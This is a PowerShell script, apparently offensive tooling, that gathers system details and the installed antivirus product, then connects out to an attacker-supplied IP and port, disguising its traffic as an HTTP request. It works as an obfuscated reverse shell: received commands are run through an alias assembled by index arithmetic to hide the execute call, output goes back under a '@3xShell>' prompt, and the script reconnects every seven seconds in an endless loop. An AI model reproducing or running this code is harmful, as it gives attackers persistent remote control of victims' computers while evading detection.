$System = (Get-WmiObject Win32_OperatingSystem).Caption;
$Version = (Get-WmiObject Win32_OperatingSystem).Version;
$Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture;
$WindowsDirectory = (Get-WmiObject Win32_OperatingSystem).WindowsDirectory;
$av = (Get-WmiObject -Namespace 'root/SecurityCenter2' -Class 'AntiVirusProduct').displayname;


$IP = "Insert IP"
$PORT = "Insert Port"
$source = "ABCERFSRGIAGSFGÑOTWEQDIAXRADI"
$Item ="0"+"X"+"F"+"E" 

function Get-UserAgent {
  # Uses PowerShell's prebuilt UA strings. See
  # http://goo.gl/9IGloI
  param (
        [ValidateSet('Firefox','Chrome','InternetExplorer','Opera','Safari')]
        [string]$browsertype
  )
  
  if (!$browsertype) {
    $browsers    = @('Firefox','Chrome','InternetExplorer','Opera','Safari')
    $browsertype = Get-Random -InputObject $browsers
  }

  [Microsoft.PowerShell.Commands.PSUserAgent]::$browsertype
	
}

function Convert(){
  $cont = 122 + 300 - 87 
  $cont - 100
  return 
}

function Convert2(){
  $cont = 30 + 6  

  return 
}

while($true){
  


  $x2 = Convert
  $X3 = Convert2
  Set-Alias   $source($source[$true-8] + ($source[[byte]$Item - $x2])+ ($source[$true+$true-7] ))
  $UserAG = Get-UserAgent
  $w = "System: $System`r`nVERSION: $Version`r`nARCH: $Architecture`r`nDIRECTORY: $WindowsDirectory`r`nAVS: $av`r`nGET /index.html HTTP/1.1`r`nHost: $p`r`n$UserAG`r`nAccept: text/html`r`n`r`n"
  $s = [System.Text.ASCIIEncoding]
  [byte[]]$b = 0..65535|%{0};

  $FC5D5B917685 = New-Object System.Net.Sockets.TCPClient($IP,$PORT)
  $z = $FC5D5B917685.GetStream()
  $d = $s::UTF8.GetBytes($w)
  $z.Write($d, 0, $d.Length)
  $LEGOLAS = "whoami"
  $t = (ABCERFSRGIAGSFGÑOTWEQDIAXRADI $LEGOLAS) + "@3xShell> "

  while(($l = $z.Read($b, 0, $b.Length)) -ne 0){
    $FC5D5B91768 = (New-Object -TypeName $s).GetString($b,0, $l)
    $d = $s::UTF8.GetBytes((ABCERFSRGIAGSFGÑOTWEQDIAXRADI  $FC5D5B91768 2>&1 | Out-String )) + $s::UTF8.GetBytes($t)
    $z.Write($d, 0, $d.Length)
  }
  
  $FC5D5B917685.Close()
  Start-Sleep -Seconds 7
}
